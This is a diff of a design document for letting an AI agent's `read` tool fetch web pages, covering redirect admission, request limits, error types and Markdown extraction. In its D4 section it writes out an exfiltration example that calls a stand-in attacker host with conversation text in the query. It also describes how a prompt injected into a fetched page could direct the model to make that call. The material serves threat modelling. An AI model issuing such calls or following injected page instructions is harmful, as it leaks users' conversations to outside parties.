@@ -30,10 +30,15 @@ The substrate, on current `master`:
   in the same package, and its trailing-selector split runs at the last colon
   after the last slash (`packages/native-file-tools/src/path.ts:262-274`) after
   the scheme prefix has been recognized.
-- The `read` description is a packaged template rendered per attempt
-  (`apps/api/src/prompts/tools/read.md`); its URL section is present as
-  commented-out guidance, so this change fills a reserved slot rather than
-  inventing one.
+- The `read` description is a packaged Handlebars template rendered per
+  attempt (`apps/api/src/prompts/tools/read.md`). On `master` it names three
+  targets (an absolute path, `kb://` under `{{#if tools.knowledge_search}}`,
+  and `skill://`) and opens with a summary line that says the tool reads a
+  local file. The web block needs no `{{#if}}` guard, because under D13 a web
+  locator is reachable whenever `read` is advertised; it is a fourth target
+  bullet plus a rewritten summary line, a redirect and `finalUrl` sentence,
+  the port and encoded-colon notes, and the note that selectors address the
+  rendered text.
 - `apps/api` has no HTTP client of its own for tool traffic. The runtime is
   Node >= 22.19 (`package.json` engines), whose global `fetch` (bundled
   undici) supports `redirect: "manual"` and a streamed body with abort; the
@@ -113,20 +118,27 @@ The substrate, on current `master`:
 
 ### D3: Redirects are followed, and each hop is admitted
 
-- **Decision**: a web read follows redirects on any host, up to 20 hops, with
-  `redirect: "manual"` so the tool owns the loop. Before each hop's request,
-  the `read` permission group is evaluated against the hop's absolute URL
-  through the same evaluator and the same projection the call used, as if the
-  model had submitted it. A rejected hop ends the call with a
-  `permission_denied` error naming the hop URL; the rejected target's body is
-  never read and no further request leaves the process. Hop decisions are
-  collected during the call and recorded with the call's decision metadata
-  when the tool call settles, in the owner-scoped tool activity and the stored
-  tool-part metadata, each with the same policy-instance ID, decision, static
-  reason, and clause reference the call decision carries. The result
-  reports `finalUrl` and no hop chain, and the `read` description says
-  redirects are followed and that `finalUrl` reports where the content came
-  from.
+- **Decision**: a web read follows redirects on any host, up to 20 in total
+  per call, with `redirect: "manual"` so the tool owns the loop. The hop
+  locator is the `Location` value resolved against the redirecting request's
+  URL by the WHATWG URL parser and serialized as its `href`; a resolved
+  locator with userinfo or a non-`http(s)` scheme fails the call with
+  `invalid_redirect` before any request and without repeating the target.
+  Before each hop's request, the `read` permission group is evaluated against
+  that locator through the same evaluator and the same projection the call
+  used, as if the model had submitted it. A rejected hop ends the call with a
+  `permission_denied` error whose message is a fixed template and whose
+  result carries the locator as `rejectedUrl`, bounded to 2,048 characters
+  with control characters removed; the rejected target's body is never read
+  and no further request leaves the process. The executor hands each hop
+  decision to the runner through a trusted callback on the tool context (the
+  runner already owns the call decision it passes to `onAdmitted`), and the
+  runner records the hop decisions with the call's decision metadata when the
+  call settles, in the owner-scoped tool activity and the stored tool-part
+  metadata, each with the same policy-instance ID, decision, static reason,
+  and clause reference the call decision carries. The result reports
+  `finalUrl` and no hop chain, and the `read` description says redirects are
+  followed and that `finalUrl` reports where the content came from.
 - **Alternatives rejected**: automatic `redirect: "follow"` (hops become
   invisible, so no rule can decide between requests and a rejected target
   would be fetched before any check); returning cross-host redirect metadata
@@ -135,19 +147,23 @@ The substrate, on current `master`:
   affordance); refusing cross-host hops outright (breaks canonical-host and
   docs redirection, and #913's acceptance requires a 302 to a rejected host to
   end with a rejection, not a refusal to follow).
-- **Consequence**: one call can issue up to 21 requests, all inside the single
-  30 s budget. A rejected hop leaves an error observation rather than partial
-  content, so a half-read page is never presented as an answer. Hop records
-  add bounded metadata (at most 20 entries) to the settled part, under the
-  rule that already excludes decision metadata from model replay, public
-  shares, exports, and search; a call that never settles loses its hop records
-  with its result, which is the same durability the result has. Recording at
-  settlement rather than before each hop keeps the executor free of a mid-call
-  durable write path. The error type is the existing `permission_denied`, so
-  consumers handle one permission error; the message distinguishes a hop. The
-  hop URL is the transport's own target rather than policy text, so the hop
-  message names it; that is the one interpolation the permission requirement
-  allows.
+- **Consequence**: one call can issue at most 27 requests (D7), all inside
+  the single 30 s budget. A rejected hop leaves an error observation rather
+  than partial content, so a half-read page is never presented as an answer.
+  Hop records add bounded metadata (at most 20 entries) to the settled part,
+  under the rule that already excludes decision metadata from model replay,
+  public shares, exports, and search; a call that never settles loses its hop
+  records with its result, which is the same durability the result has.
+  Recording at settlement keeps the executor free of a mid-call durable write
+  path, and the callback keeps hop decisions out of the model-visible
+  `ToolResult`. The error type is the existing `permission_denied`, so
+  consumers handle one permission error; the message distinguishes a hop.
+  Because the hop locator is chosen by the redirecting server, it is
+  attacker-controlled text; it therefore travels in a bounded structured
+  field rather than inside the fixed message, which keeps the permission
+  requirement's no-interpolation rule intact. Policy sees the parser's
+  serialization of a hop (lowercase host, default port dropped), so the
+  runbook tells operators to write hop-relevant rules against that form.
 
 ### D4: No URL-provenance rule and no additional packaged notice
 
@@ -165,7 +181,12 @@ The substrate, on current `master`:
 - **Consequence**: a page's text reaches the model under the same framing as a
   Knowledge read, so a prompt injected by a fetched page has the standing of
   any other tool output and no llame-side signal distinguishes it. The
-  operator's `read` group is the boundary, and the runbook says so.
+  outbound direction is accepted too: a GET's path and query are
+  model-authored, so under the recommended policy
+  `read https://attacker.example/?d=<conversation text>` is one admitted call
+  that leaves the process, and a page or Knowledge file can instruct it. The
+  operator's `read` group is the boundary in both directions; the runbook
+  names both threats.
 
 ### D5: No cache
 
@@ -197,13 +218,18 @@ The substrate, on current `master`:
 
 ### D7: Bounds and status handling
 
-- **Decision**: 10 s to response headers, 30 s total for the call across every
-  hop and probe request, a 5 MiB streamed body cap aborted with
-  `body_too_large`, and no retries. A 429 is returned as an error observation
-  carrying `Retry-After` when present; every other non-2xx status returns an
-  error naming the status. Only `http` and `https` are admitted, userinfo in
-  the locator fails `invalid_path`, and `Accept-Encoding` is left to the
-  runtime.
+- **Decision**: 10 s to response headers (`headers_timeout`), 30 s total for
+  the call across every request it issues (`call_timeout`), a 5 MiB streamed
+  body cap aborted with `body_too_large`, and no retries. Any non-2xx status
+  on the first request or a hop fails the call with `http_status` naming the
+  status, and a 429 also carries `Retry-After` when present; a probe's
+  non-2xx status or refused content type only disqualifies that candidate,
+  because the suffix probe and the `llms.txt` walk expect 404 as their
+  ordinary answer. Request count per call is bounded: one alternate, one
+  suffix probe, four `llms.txt` candidates, and 20 redirects in total
+  (`too_many_redirects`), so at most 27 requests. Only `http` and `https` are
+  admitted, userinfo in the locator fails `invalid_path`, and
+  `Accept-Encoding` is left to the runtime.
 - **Alternatives rejected**: retrying transport failures or 429 (hidden
   latency inside a fixed budget and a duplicated request for a server that
   already answered; omp retries 429 once and rotates three user agents on
@@ -301,10 +327,11 @@ The substrate, on current `master`:
   check would notice); allowing cleartext HTTP by default (it gives up
   transport security for a public read while the model can always be given the
   `https://` form).
-- **Consequence**: copying the example admits public HTTPS reads and refuses
-  cleartext and grokipedia. The narrower policy is one edit the runbook shows,
-  and the delta spec's scenario proves it rejects every other authority rather
-  than silently admitting one.
+- **Consequence**: an operator who copies the example and adds `read` to
+  `tools.allowed` (the example allowlists only `search_conversations`) admits
+  public HTTPS reads and refuses cleartext and grokipedia. The narrower policy
+  is one edit the runbook shows, and the delta spec's scenario proves it
+  rejects every other authority rather than silently admitting one.
 
 ### D12: Result shape
 
@@ -352,14 +379,16 @@ The substrate, on current `master`:
 
 ## The adapter pipeline
 
-Ordered, for an HTML response and without `:raw`. Every step requests with the
-same `Accept` header and is subject to the same bounds, status, content-type,
-and redirect rules as the first request.
+Ordered, for an HTML first response and without `:raw`. Every step requests
+with the same `Accept` header, under the same bounds, headers, per-hop
+admission, and redirect rules as the first request; a probe's non-2xx status
+or refused content type disqualifies that candidate and the pipeline
+continues.
 
 1. **Negotiation.** The first request sends
    `Accept: text/markdown, text/plain;q=0.9, text/html;q=0.8, */*;q=0.5`. A
    `text/markdown` body, or a `text/plain` body that is not HTML-shaped, is
-   the render: `method: "negotiated"`.
+   the content as served, ungated and unconverted: `method: "negotiated"`.
 2. **Announced alternate.** A Markdown URL announced by the response's `Link`
    header or by a `<link rel="alternate" type="text/markdown">` element in the
    head is fetched: `method: "alternate"`.
@@ -368,21 +397,23 @@ and redirect rules as the first request.
 4. **Local render.** Readability's main-content extraction, converted with
    Turndown and GFM tables; the whole body is converted when Readability finds
    no article: `method: "readability"`.
-5. **`llms.txt` walk.** Only after the local render fails the quality gate, the
-   walk requests `llms.txt` candidates from the deepest path segment up to the
-   site root: `method: "llms-txt"`.
+5. **`llms.txt` walk.** Only after the local render fails the quality gate, at
+   most four candidates from the deepest path segment up to the site root
+   (the three deepest scopes and the root): `method: "llms-txt"`. An index
+   file is short link lines by construction, so a candidate is accepted on
+   length and not-HTML-shaped alone, as omp's `tryLlmEndpoints()` does.
 6. **Raw body.** The last resort is the response body with a note:
    `method: "raw"`.
 
-The quality gate applies to every candidate in steps 1-5: more than 100
-non-whitespace characters, not HTML-shaped for a Markdown candidate, and not
-low quality, where low quality means under 1,024 characters containing a
-JavaScript or captcha gate phrase, or more than 70 percent of non-blank lines
-shorter than 40 characters. The first candidate that passes wins and ends the
-search.
+The quality gate applies to steps 2-4: more than 100 non-whitespace
+characters, not HTML-shaped for a Markdown candidate, and not low quality,
+where low quality means under 1,024 characters containing a JavaScript or
+captcha gate phrase, or more than 70 percent of non-blank lines shorter than
+40 characters. The first candidate that passes wins and ends the search.
 
-A non-HTML text body skips the pipeline and is reported as `method: "text"`.
-`:raw` skips every step and returns the first response body untouched.
+A text body outside the negotiation set (JSON, XML, other `text/*`) skips the
+pipeline and is returned unchanged as `method: "text"`. `:raw` skips every
+step and returns the first response body untouched.
 
 ## Dependencies
 
@@ -411,9 +442,10 @@ Facts gathered from primary sources; the peer report is at
   then a `.md` suffix probe, then a re-fetch with
   `Accept: text/markdown, text/plain;q=0.9, text/html;q=0.8`, then feed
   alternates, then a reader-backend chain, then an `llms.txt` walk, then the
-  raw body; its gate is `>100` non-whitespace characters plus a low-quality
-  test at `<1024` characters with JavaScript/captcha phrases or `>70%` short
-  lines; it sets `Accept-Encoding: identity` because
+  raw body; its reader-backend gate is `>100` non-whitespace characters plus
+  a low-quality test at `<1024` characters with JavaScript/captcha phrases or
+  `>70%` short lines, while its `llms.txt` walk applies only the length and
+  not-HTML test; it sets `Accept-Encoding: identity` because
   "Cloudflare Markdown-for-Agents returns corrupted bytes when compression is
   negotiated"; it rotates three user agents on block detection, retries 429
   once honoring `Retry-After` up to 10 s, caps bodies at 50 MB, performs no
@@ -505,3 +537,23 @@ new path.
   dependencies with licenses and the linkedom spike, the single version seam
   the `opencode-go-provider` change owns, and the four deferrals with their
   issues (#914, #915, #916, #917).
+- v2 (2026-09-21): Adversarial review round 1 (two independent reviewers,
+  21 findings, all accepted). Contract fixes: a negotiated body is ungated and
+  `method: "text"` is scoped to bodies outside the negotiation set; probe
+  failures disqualify the candidate instead of the call; `llms.txt`
+  candidates are judged on length and shape only, as omp does; request and
+  redirect budgets are per call (27 requests at most); named error types
+  `headers_timeout`, `call_timeout`, `http_status`, `too_many_redirects`,
+  `invalid_redirect`; the hop locator is the WHATWG serialization of the
+  resolved `Location`, userinfo or non-web hops fail closed, and the rejected
+  locator travels in a bounded `rejectedUrl` field rather than inside the
+  fixed message; hop decisions reach the runner through a trusted tool-context
+  callback; `path` is reported with the selector stripped; a literal colon in
+  the last path segment must be encoded. Layering: the `fetch` layer does not
+  follow redirects, so `master` never carries unguarded hop following between
+  merges. Corrections: the llmstxt.org acceptance row yields `md-suffix`
+  (the site serves `/index.md`), the Readability example is a Wikipedia
+  article, the `read.md` placeholder claim is replaced with the template's
+  actual structure, D4 states the outbound exfiltration consequence, D11 says
+  `read` must also be allowlisted, and the proposal names the candidate
+  resolver and portable policy fixture.
